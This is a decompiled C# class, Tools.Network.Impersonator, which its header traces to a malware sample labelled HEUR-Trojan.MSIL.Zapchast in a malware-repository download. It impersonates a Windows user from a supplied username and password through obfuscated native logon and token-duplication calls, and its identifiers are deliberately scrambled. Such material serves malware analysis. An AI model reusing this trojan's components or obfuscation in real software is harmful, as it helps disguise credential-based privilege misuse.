// Decompiled with JetBrains decompiler
// Type: Tools.Network.Impersonator
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Tools.Network
{
  public class Impersonator : IDisposable
  {
    private WindowsImpersonationContext _wic;

    public Impersonator(
      string userName,
      string domainName,
      string password,
      ᗲ\uE31C痥亚햯뵉㜐\uE89A膮焧\uF6FC\u9FF5鱍屓\uFFFD犔㣁ꊎ\uE0EF\uFFFD logonType,
      挙ꢔ퓅起洷댚\uF3EC嬨燋Ԭ\uEAF5\uE8F3ᾃ鄩ႁ\uE05D٘\uFFFD᳠䏜 logonProvider)
    {
      this.Impersonate(userName, domainName, password, logonType, logonProvider);
    }

    public Impersonator(string userName, string domainName, string password) => this.Impersonate(userName, domainName, password, ᗲ\uE31C痥亚햯뵉㜐\uE89A膮焧\uF6FC\u9FF5鱍屓\uFFFD犔㣁ꊎ\uE0EF\uFFFD.孈ᵁ秊鐻籡ﬆ簲鼼崎\u0965\u21E5\uE198Ԛꚧㄴㆡ̙\uFFFD㷥\uF648, 挙ꢔ퓅起洷댚\uF3EC嬨燋Ԭ\uEAF5\uE8F3ᾃ鄩ႁ\uE05D٘\uFFFD᳠䏜.\uEB61ᅟ豾㣵\u2E1F铎ଷ辰\u0C0D䫝졳\uFFFD麚䅚䊀\u28EA檹奱坛欝);

    public Impersonator()
    {
    }

    public void Dispose() => this.UndoImpersonation();

    public void Impersonate(string userName, string domainName, string password) => this.Impersonate(userName, domainName, password, ᗲ\uE31C痥亚햯뵉㜐\uE89A膮焧\uF6FC\u9FF5鱍屓\uFFFD犔㣁ꊎ\uE0EF\uFFFD.孈ᵁ秊鐻籡ﬆ簲鼼崎\u0965\u21E5\uE198Ԛꚧㄴㆡ̙\uFFFD㷥\uF648, 挙ꢔ퓅起洷댚\uF3EC嬨燋Ԭ\uEAF5\uE8F3ᾃ鄩ႁ\uE05D٘\uFFFD᳠䏜.\uEB61ᅟ豾㣵\u2E1F铎ଷ辰\u0C0D䫝졳\uFFFD麚䅚䊀\u28EA檹奱坛欝);

    public void Impersonate(
      string userName,
      string domainName,
      string password,
      ᗲ\uE31C痥亚햯뵉㜐\uE89A膮焧\uF6FC\u9FF5鱍屓\uFFFD犔㣁ꊎ\uE0EF\uFFFD logonType,
      挙ꢔ퓅起洷댚\uF3EC嬨燋Ԭ\uEAF5\uE8F3ᾃ鄩ႁ\uE05D٘\uFFFD᳠䏜 logonProvider)
    {
      this.UndoImpersonation();
      IntPtr zero1 = IntPtr.Zero;
      IntPtr zero2 = IntPtr.Zero;
      try
      {
        this._wic = WindowsIdentity.Impersonate(IntPtr.Zero);
        if (\u3296䵮밮\uFFFD햁\u2240낛웩쐖䓍뜔怚卍盱衁ꬲ坭뉎ę\u16EB.\u0344蹍꾑畖꾅꿤峫᱄炰穖\u28E1㻿誺닲䥘ꏰ\uE718బ꼒랭(userName, domainName, password, (int) logonType, (int) logonProvider, ref zero1) == 0)
          throw new Win32Exception(Marshal.GetLastWin32Error());
        if (\u3296䵮밮\uFFFD햁\u2240낛웩쐖䓍뜔怚卍盱衁ꬲ坭뉎ę\u16EB.甿ﴑ짞ꯂ䨴㯤ﯴᙑ\u27FD䍬쪕\uF7F4뿑\uEBA1\uFFFD鉊ᯖ䫁ꂟ禎(zero1, 2, ref zero2) == 0)
          throw new Win32Exception(Marshal.GetLastWin32Error());
        new WindowsIdentity(zero2).Impersonate();
      }
      finally
      {
        if (zero1 != IntPtr.Zero)
          \u3296䵮밮\uFFFD햁\u2240낛웩쐖䓍뜔怚卍盱衁ꬲ坭뉎ę\u16EB.觋膲\u038B\u175C噜\u0A61杋魏\uEF2A凄瑗\uFFC0吏\uEC81暒祖瀰䫜䚏煻(zero1);
        if (zero2 != IntPtr.Zero)
          \u3296䵮밮\uFFFD햁\u2240낛웩쐖䓍뜔怚卍盱衁ꬲ坭뉎ę\u16EB.觋膲\u038B\u175C噜\u0A61杋魏\uEF2A凄瑗\uFFC0吏\uEC81暒祖瀰䫜䚏煻(zero2);
      }
    }

    private void UndoImpersonation()
    {
      if (this._wic != null)
        this._wic.Undo();
      this._wic = (WindowsImpersonationContext) null;
    }
  }
}
